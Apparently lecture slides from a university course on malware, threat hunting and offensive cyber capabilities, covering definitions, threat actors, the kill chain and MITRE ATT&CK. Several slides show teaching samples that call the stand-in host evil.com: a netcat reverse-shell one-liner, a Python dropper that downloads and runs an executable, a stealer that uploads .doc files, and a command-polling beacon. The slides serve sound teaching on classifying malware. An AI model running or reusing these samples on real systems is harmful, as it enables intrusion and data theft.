---
theme: night
slideNumber: true
---

<!-- slide bg="[[Green Logo.svg]]" background-size="auto" -->

---


<!-- slide template="[[Split Vertical]]" -->
::: title
#### CS-4973
:::
::: left
![[Green Logo.svg | 400]] <!-- element style="object-fit: cover" -->

:::
::: right
<!-- element style="font-size: 32px;align:center" -->
Introduction to Malware, Threat Hunting & Offensive Capabilities Development
:::

---
<!-- slide template="[[Title Slide]]" -->
 ## Reminder:
 CFAA is a a big hammer. 

---
<!-- slide template="[[Title Slide]]" -->
 ## Lecture 0x01: 
Basics of Real Life Threat Analysis 
Learning an entirely new language 
---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Definitions are important
:::

::: left
- Specialist language facilitates precise communication about complex topics.
- Infosec is full of technical jargon and corporate speak.
- It is also full of marketing teams that make up their own jargon.
:::

::: right
![[0x01_slide_4_image.png|400]]


:::

---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Definitions are important
:::

::: left
<!-- element style="font-size: 24px"-->
- Unfortunately, unlike Mathematics, there really isn’t a single  (trustworthy!) authority for definitions. 
- There are efforts in place to standardize vocabulary, but you will likely have context dependent jargon based on where you work.

:::

::: right
![[0x01_slide_5_image.png|450]]


:::

---
<!-- slide template="[[Base Slide]]" -->

::: title
#### Jargon
:::

- Military folks, Intelligence community vets, policy wonks, hackers and Punks, all have their own culture, definitions, and slang.
- You will encounter folks with all kinds of ideas and political beliefs.
- Many of whom have large platforms. Some with really bad takes dressed up in legitimizing jargon.

---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### BS Detector 
:::

::: left
<!-- element style="font-size: 24px"-->
- Infosec is saturated  with BS 
- Infosec evolves rapidly.
- Many people (myself included) constantly feel like they are  behind the curve and playing catch up
- Marketers capitalize on this to make you feel out of the loop :smile:
- spend $>0$ time at a con booth to suffer

:::

::: right
![[0x01_slide_6_image.png|300]]


:::

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Technical Definitions

:::

- [[Malware]]
- Threat Hunting
- Offensive Cyber Capabilities

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Definitions

:::

#### [[Malware]]
Unwanted, malicious software. 
- It has a bunch of definitions, and can get very meta.
- At the end of the day, it is code that “does a thing” that the person who ran it might not either expect or want.
- Context matters. Is PSExec Malware? Is Slack malware? Is RDP malware? Is Exchange Malware? Is 
Crowdstrike’s  EDR malware?  


---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Common activities performed by malware 

:::

- Host enumeration: `whoami`, `whereami`, `whatami`
- Network enumeration: what can I talk to, where can I get to?
- Execute: Powershell, Batch, shellcode…etc
- Download: get data onto the computer
- Exfiltrate : get data out of the computer 
- Process Manipulation: start, list, modify, and kill processes
- External Messaging: communicate with an 
external server
- Are these indicators of a malicious program? 

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Common activities performed by malware 

:::
##### TLDR Malware interacts with
- File system
- Processes
- Various system resources

Is malware the only one?
---
<!-- slide template="[[Split Vertical]]" -->
::: title
#### Wacom
:::

::: left
<!-- element style="font-size: 24px"-->
- Collect information about running processes
- Usage statistics

This seems suspicious. Is it malware?


 https://www.zdnet.com/article/wacom-drawing-tablets-track-every-app-you-open/

:::

::: right
![[0x01_slide_10_image.png|500]]


:::

---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Malware is Subjective
:::

::: left
- The line between analytics and marketing and spyware can get blurred pretty quickly
- Surveillance is usually legal 
 
:::

::: right
![[0x01_slide_11_image.png|300]]


:::
---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Is Slack Malware
:::

::: left
- Slack is a 
messaging
 service 
- Slack allows you to host static files of any type and create public download links. 
- Slack lets you script communication in its messenger, and can be used as a communication channel 
- https://threatpost.com/attackers-discord-slack-malware/165295/

:::

::: right
![[0x01_slide_12_image.png|300]]


:::

---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Google Gsuite? 
:::

::: left 
<!-- element style="font-size: 24px"-->
- Gsuite logs IP address of where you logged in
- It stores all of your google searches
- "User log events"
:::
::: right 
![[google-jerry.png]]
:::
---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### PSExec: Goodware?
:::

::: left
<!-- element style="font-size: 18px"-->
- PSExec is a utility from the sysinternals suite of tools.
- It is used to execute powershell commands/scripts on a remote machine and is incredibly useful for sysadmins 
- It is also 
commonly
 used in offensive cyber operations 
	- Note that it is less common now because it became the 
default
 method for many popular tools, and vendors got good at flagging it. 
	- It is still commonly used by crimeware.
- https://www.mandiant.com/resources/a-nasty-trick-from-credential-theft-malware-to-business-disruption

:::

::: right
![[0x01_slide_13_image.png|500]]


:::

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Is Crowdstrike’s Agent Malware (Falcon)

:::

- Short answer: No…well kind of but seriously no (don't sue me please). 
- It acts a lot like malware does! If you ever gain control of a 
company's
 Falcon endpoint, they are probably screwed! 
- Falcon is a a set of tools designed to “stop breaches”
- It does so by gathering telemetry, spying on processes, and alerting/responding to activity it deems malicious. 
- https://github.com/Mr-Un1k0d3r/EDRs/blob/main/EDRs.md


---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Definitions
:::

::: left
<!-- element style="font-size: 24px"-->
- What makes malware different from an antivirus?
- How is a hacked 
exchange
 server any 
different
 from a dedicated 
malicious
 server?
- Is Crowdstrike malware with (really) good marketing?
- Meme src: 
https://twitter.com/__winn


:::

::: right
![[0x01_slide_15_image.jpg|500]]


:::

---
<!-- slide template="[[Split Vertical]]" -->
::: title
#### Weird Machines

:::

::: left
- What if I execute malicious code only using instructions inside of a legitimate program?
- Is PDF parser malware?
- is libc malware?
- Recommended
 reading: 

 <small>
 https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html
</small>
:::

::: right

![[Pasted image 20250108131937.png]]
:::



---
<!-- slide template="[[Base Slide]]" -->
::: title 
#### Types of Threat Hunting 
:::
- Analysis/Detection of new malicious activity, creating detection rules, attribution. 
- Attribution: understanding attacker environments. 

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Definitions 

:::

#### Offensive Cyber Capabilities
- For this class, we’ll define it as “A device or computer that allows an adversary to execute on an objective during a cyber operation.”
- Note this can also get very meta.
- Usually, I will just say "capability"

---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Offensive Cyber Capabilities
:::

::: left
- Example: 
Wiper malware that is capable of bricking PCs
- Non-Example: 
Rockets that could be used to blow up AWS data centers
- Gray-Area:
 Neurolink super-squirrels that can be used to chew through fiber optic cables

:::

::: right
![[0x01_slide_23_image.png|300]]


:::

---
<!-- slide template="[[Title Slide]]" -->
 ## Cyber Operations 101
---
<!-- slide template="[[Base Slide]]" -->
::: title
#### What is a Cyber Operation?

:::

<!-- element style="font-size: 24px"-->
- Well…It is an operation that takes place in 
cyberspace


---
<!-- slide template="[[Base Slide]]" -->
::: title
#### A variety of actors conduct cyber operations

:::

- Government/Government backed Actors
- Criminals
- Hacktivists
- Mercenaries/Private Industry
- Literal 
children



---
<!-- slide template="[[Base Slide]]" -->
::: title
#### A variety of actors conduct cyber operations

:::

- Advanced Persistent Threats (APTs): 
usually associated with Government actors, but any actor conducting cyber operations that can consistently target a set of victims and succeed can fall under this category. 

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Advanced Persistent Threats (APTs)
:::

- Large criminal groups  often with tacit government approval/protection 
	-  Fin6, Emotet, IceID, Dridex, Conti
- Cyber Mercenaries / Contractors 
	- (APT3 -> Hacking Team, Boyusec, Appin Security, Positive Technologies, NSO Group )
- Government Intelligence Agencies 
	- (FSB -> APT29, RGB -> Lazarus Group, NSA TAO → Equation/G0020)

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Why Conduct Cyber Operations?

:::

- I.e. What is the  <b > tactical objective </b> of a cyber operation?

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Why conduct cyber operations?

:::

- Activism: DDoS attacks to shut down Nazi sites. Hack and leak of Hacking Team
- Crime/\$: Ransomware, stealing credentials, installing coin miners
- Espionage/ Computer Network Exploitation (CNE): commercial vs. geopolitical -> stealing Intellectual Property / state secrets
- “Warfare"/ Computer network Attack (CNA):  Shutting down a country’s internet, disrupting power grids, making nuclear centrifuges spin too fast, etc. 
- Clout/Trolling/fun: Go to Shodan.io and search for sites with an HTML title “Hacked by*”


---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Some actors do a mix
:::

::: left
<!-- element style="font-size: 24px"-->
North Korea: 
- Bank heists
- Ransomware attacks
- Hack & Leak
- Destructive malware
- Espionage 
- Img: https://www.bbc.com/news/stories-57520169


:::

::: right
![[0x01_slide_32_image.jpg|400]]


:::

---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Example 1: OPM hack
:::

::: left
<!-- element style="font-size: 24px"-->
- Target: Gov
- Attacker: Gov (espionage)
Benefit:  intel/counterintel
- “The compromised data included SF-86 forms which contain intimate details about the prospective employee’s personal life, family members, and other contacts.”


:::

::: right
![[0x01_slide_33_image.jpg|400]]


:::

---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Example: Twitter hack
 
:::

::: left
<!-- element style="font-size: 24px"-->
- Target: Corporation/
Individuals
Attacker: Users / Individuals
Benefit: Ego + Money
- What else could he have done?
- Does social engineering count as an offensive cyber capability?


:::

::: right
![[0x01_slide_34_image.jpg|400]]


:::

---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Example: Monitoring 
:::

::: left
<!-- element style="font-size: 24px"-->
- Target: User(s) (literal children in this case)
- Attacker: 
Organization
- Benefit: 
surveillance
- Is “Find my friend” Malware?
- Exam monitoring software?
- What happens if someone compromises GoGuardian?


:::

::: right
![[goguradian_bad.png|px 300]]
![[0x01_slide_35_image.png|200]]


:::

---
<!-- slide template="[[Split Vertical]]" -->
::: title
#### Example: Stalkerware
:::
::: left
- Target: User(s). Often times domestic partners
- Attacker: Organization/ other Users
- Benefit: Surveillance
- What happens if someone compromises MobiiSpy? 

We don't need to wonder...
:::
::: right
![[mobispy-article.png]]
:::
---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Example: Jamal Khashoggi Assasination
:::

::: left
<!-- element style="font-size: 24px"-->
- Target: Individual(s) 
Attacker: Foreign Government +  Mercenary 
- Benefit: Political

:::

::: right
![[0x01_slide_36_image.png|300]]


:::


---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Example: Stuxnet
:::

::: left
- A Sophisticated malware used during a (likely) joint US-Israel cyber operation 
designed
 to disrupt Iran’s Nuclear program
 - Goal: disrupt nuclear program
 - capability:  degrade centrifuges 
- For more on this, see “Countdown to Zero Day” By Kim Zetter

:::

::: right 
![[clippy.png]]
:::

---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Example: Advertising 
:::

::: left
<!-- element style="font-size: 28px"-->
- Target: User
- “Attacker”: Company (No sue plz)
- Benefit: Money 
- Remember Wacom? They were using Google Analytics 
- Note Facebook and Google are not intelligence companies per say. 
:::

::: right
![[0x01_slide_37_image.png|300]]


:::



---
<!--slide template="[[Split Vertical]]"-->
::: title
#### Recent example
:::
::: left
<!-- element style="font-size: 28px"-->
- Data broker collected geolocation of users
- Did so by bundling SDK into legitimate apps
:::

::: right
![[xmode-banned.png]]
:::
---
<!--slide template="[[Title Slide]]"-->
 Make no mistake, digital marketing companies have impressive surveillance capabilities
  

---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Example: Opportunistic Mass Exploitation
:::

::: left
<!-- element style="font-size: 28px"-->
- Saltstack RCE
- Target: LineageOS, GHost, DigiCert 
- (anyone vulnerable to a specific exploit)
- Attacker: various
- Benefit: Financial 
- What else could they have done? 
<small> 
 - https://thehackernews.com/2020/05/saltstack-rce-exploit.html
 </small>
:::

::: right
<right>
  ![[0x01_slide_38_image.png|500]]
</right>
:::

---
<!-- slide template="[[Title Slide]]" -->
 ## Malware 101
---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### What platforms does Malware target?
:::

::: left
<!-- element style="font-size: 24px"-->
Anything that can run code is  susceptible to malware 

:::

::: right
![[0x01_slide_40_image.png|700]]


:::


---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Definitions: Common types of malware 

:::

- Loader / Dropper: software that loads/downloads and executes other  malicious programs.
- Spreader/Worm:  software designed to spread malicious content on the system/executes the first of the attack. 
- Miner: malicious software that mines cryptocurrency on a victim machine. 
- Locker/Wiper:  malware that encrypts/destroys files on a victim machine .


---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Definitions: Common types of malware  (cont)

:::

- Backdoor: Similar to a loader/dropper but specifically designed to regain access. Usually has less functionality. 
- Spyware/RAT: collections of tools designed to spy on the victim machine that is usually controlled by a remote server. 
- Stealer: Similar to spyware, but generally automatically pillages a computer for all available passwords, crypto wallets...etc  and exits. 
- Implant:  catch all term for malware “implanted” on a victim machine 
- "shell"



---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Common thread
:::
- Malware performs often time legitimate actions on machines with the purpose of interacting with system resources 
- shell: "**the outermost layer around the operating system**"

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Some Examples of Shells
:::
- bash, zsh, fish, powershell


---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Some Examples of serving Shells
:::
- bash, zsh, fish, powershell
- Bind Shell: serve a shell (like bash) to a client who connects to the server 
- Reverse Shell: Connect out to a remote server, and serve a shell 
- Beacon: "asynchronous" ping/pong 

---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Definitions: Less common types of malware 

:::

::: left
<!-- element style="font-size: 18px"-->
### Rootkit
Generally speaking this is a subclass of spyware. Rootkits are deployed on victim machines that usually have been “rooted” or where the attacker has escalated their privileges on the device. They usually try to hide their existence by hiding (among other things) processes,  network traffic/connections, and files from the OS. Subclasses are defined based on what ring they run in.  
- Is a debugger a rootkit?
- What about Riot Game’s Anti Cheat engine for Valloran?

:::

::: right
![[0x01_slide_42_image.png|300]]


:::

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### C2 / Command and Control

:::

- Malware is just code. It is created to perform a job, and usually takes its marching orders from, and sends results  to remote servers
- We call these servers Command and Control Servers (C2s) 
- We call the 
mechanism
 that sends data to and from C2 servers the 
C2 Channel
- Note some malware is autonomous (Wanacry)
- Some malware uses P2P communication (Game Over Zeus)
- Some malware is deployed as a larger “Post Exploitation” effort (Cobalt strike anyone?)


---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Examples of C2 Channels
:::

::: left
<!-- element style="font-size: 24px"-->
- TCP
- UDP
- ICMP
- HTTP(s)/ HTTP2/HTTP3
- DNS
- TLS handshakes/heartbeats
- Trusted 3rd Parties 
- Other “Exotic” methods  


:::

::: right
![[0x01_slide_44_image.png|270]]


:::

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### APT ChonkyBear

:::


#### ChonkyBear
- Dropper
- Shell
- Loader
- Backdoor/beacon
- "spy"
- Locker


---
<!-- slide template="[[Title Slide]]" -->
 ## How does Cyber Threat Analysis / Threat Hunting Work? 
---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Goal of Threat Hunting

:::


Searching environments to detect and isolate malicious activity.


Analysis/Detection of new malicious activity, creating detection rules, attribution. 

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Goal of Threat Hunting

:::

Defensive 
- Finding new phishing emails, figuring out who is targeting your company and why, figuring out how to block malware or the emails from getting to your inbox in the first place. 

Offensive:
- Finding out there’s a bunch of phishing emails that compromised another company in your industry, and emulating the attack on your own company to see if it succeeded.
	- Identifying the actors who carried out the phishing campaign

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Frameworks 

:::
## There are too many frameworks for talking about Cyber Operations.
Popular choices are 
- Lockheed  Martin Cyber Kill Chain 
- MITRE ATT&CK


---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### Cyber Killchain
:::

::: left
<!-- element style="font-size: 26px"-->
- Framework for identifying the steps an adversary takes to execute on a tactical objective 
- As defenders, if you can “break a link in the chain” you can disrupt an adversaries operation 


:::

::: right
![[0x01_slide_52_image.png|300]]


:::

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### MITRE ATT&CK

:::

<!-- element style="font-size: 24px"-->
- Similar approach to Cyber Killchain
- Goes into detail about specific TTPs: Tactics, Techniques, and procedures 
- Is an industry standard for talking about how an objective was achieved or how an action was performed
- https://attack.mitre.org/matrices/enterprise/
- https://attack.mitre.org/resources/faq/
- https://attack.mitre.org/matrices/enterprise/linux/
- This course takes many of its definitions from MITRE
- It is far from a perfect framework, but it is another (incredibly useful) tool in your arsenal


---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### TTPs: Tactics 
:::

::: left
<!-- element style="font-size: 24px"-->
- Tactics represent the ‘why’ of an ATT&CK technique or sub-technique.
-  It is the adversary’s tactical goal: the reason for performing an action. For example, an adversary may want to achieve credential access.”
- Example: Disrupting Iran’s nuclear program


:::

::: right
![[0x01_slide_54_image.png|200]]


:::

---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### TTPs: Techniques
:::

::: left
<!-- element style="font-size: 24px"-->
- “Techniques represent “how” an adversary achieves a tactical goal by performing an action. For example, an adversary may dump credentials to achieve credential access.”
- This includes the tools used, and you will 
sometimes hear me slip up and say 
tactics tools and procedures


:::

::: right
<center>

`nc -e /bin/sh evil.com 1234`

:::

---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### TTPs: Sub-Technique 
:::

::: left
<!-- element style="font-size: 24px"-->
- Sub-techniques are a more specific description of the adversarial behavior used to achieve a goal. They describe behavior at a lower level than a technique. For example, an adversary may dump credentials by accessing the Local Security Authority (LSA) Secrets.”

:::

::: right
![[0x01_slide_56_image.png|300]]


:::

---
<!-- slide template="[[Split Vertical]]" -->
::: title
 #### TTPs: Procedures
:::

::: left
<!-- element style="font-size: 20px"-->
 Procedures are the specific implementation the adversary uses for techniques or sub-techniques. For example, a procedure could be an adversary using PowerShell to inject into lsass.exe to dump credentials by scraping LSASS memory on a victim. Procedures are categorized in ATT&CK as the observed in the wild use of techniques in the ‘Procedure Examples’ section of technique pages.”

I like to think of this as “what playbooks does this specific actor use”?

:::

::: right
![[0x01_slide_57_image.png|600]]


:::

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### This course

:::

- In this class, we will mostly use MITRE ATT&CK but only vagulely
- It is a useful framework for comparing cyber operations


---
<!-- slide template="[[Base Slide]]" -->
::: title
#### More Definitions

:::

### You need to know this
- Indicators of Compromise (IOCs):
 sets of forensic data found when malicious activity occurs. (IPs / domains of a C2 server, hash values of malware, email accounts of phishing email senders..etc)
- Hash value:
 the unique(ish) fingerprint of a single file 
- IP address: 
the address of a computer on a network.
- Domain Name:
 an entry for a A/AAAA record used by a DNS servers to map human friendly names (like google.com) to computer friendly IP addresses (8.8.8.8).


---
<!-- slide template="[[Base Slide]]" -->
::: title 
#### Baby's First Malware
:::
```python
import requests
import os
r = requests.get("https://evil.com/evil.exe")
if r.status_code == 200:
	out = "FreeCandy.exe"
	with open(out, "wb+") as f:
		f.write(r.content)
	os.system(out)
```

---
<!-- slide template="[[Base Slide]]" -->
::: title 
#### Baby's First Malware
:::
- This code downloads and executes a binary
- Based on the URL, it is safe to assume that the content is probably malicious 
- Malware Classification: Probably a dropper
- Tactics:
	- Execution: 
		- Techniques: 
			- Command and Scripting Interpreter
				- Sub Techniques: 
					- Command and Scripting Interpreter: Python



---

<!-- slide template="[[Base Slide]]" -->
::: title
#### Baby's Second Malware
:::
```python

import os, fnmatch, requests
def find(pattern, path):
    result = []
    for root, dirs, files in os.walk(path):
        for name in files:
            if fnmatch.fnmatch(name, pattern):
                result.append(os.path.join(root, name))
    return result
def upload(path):
	try:
		with open(path, "rb") as f:
			data = f.read()
		requests.post("https://evil.com/gate/php", data=data)
	except Exception as e:
		pass
	return
	
p = find('*.doc', '/')
for i in p:
	upload(p)
```

---
<!-- slide template="[[Base Slide]]" -->
::: title 
#### Baby's Second Malware
:::
- This code searches for files that match "\*.doc" 
- If able, it then reads the contents and uploads them to a remote server
- Verdict: Probably some sort of stealer
- Tactic:  Collection, Exfiltration
- Technique: Command and Scripting Interpreter: Python

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Baby's third Malware
:::
###
###

```python3
import os, fnmatch, requests, time
def find(pattern, path):
    result = []
    for root, dirs, files in os.walk(path):
        for name in files:
            if fnmatch.fnmatch(name, pattern):
                result.append(os.path.join(root, name))
    return result
def upload(path):
	try:
		with open(path, "rb") as f:
			data = f.read()
		requests.post("https://evil.com/gate/php", data=data)
	except Exception as e:
		pass
	return
	
while True:
	r = requests.get("https://evil.com/gate/php")
	data = r.json()
	if  data["cmd"] == "exec":
		os.system(data["args"])
	elif data["cmd"] == "drop":
		r = requests.get("https://evil.com/evil.exe")
		if r.status_code == 200:
			out = "FreeCandy.exe"
			with open(out, "wb+") as f:
				f.write(r.content)
			os.system(out)
		
	elif data["cmd"] == "exfil":
		p = find(cmd["pattern"], cmd["path"])
		for i in p:
			upload(p)
	else:
		pass
	time.sleep(60)
```

---
<!-- slide template="[[Base Slide]]" -->
::: title 
#### Baby's Third Malware
:::
- This code seems combine functionality from the first 2 samples!
- It also seems to pull down tasks from a remote server to execute
- Think about how we would map this to MITRE ATT&CK!

---
<!-- slide template="[[Base Slide]]" -->
::: title
#### Tactics for this Course
:::
- You are responsible for reading through the following Tactics

- [Execution](https://attack.mitre.org/tactics/TA0002)
- [Persistence](https://attack.mitre.org/tactics/TA0003)
- [Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
- [Discovery](https://attack.mitre.org/tactics/TA0007)
- [Collection](https://attack.mitre.org/tactics/TA0009)
- [Exfiltration](https://attack.mitre.org/tactics/TA0010)
- [Command and Control](https://attack.mitre.org/tactics/TA0011)
- [Impact](https://attack.mitre.org/tactics/TA0040)
---
<!-- slide template="[[Title Slide]]" -->
 ## Discussion:
What do we need to control a computer?
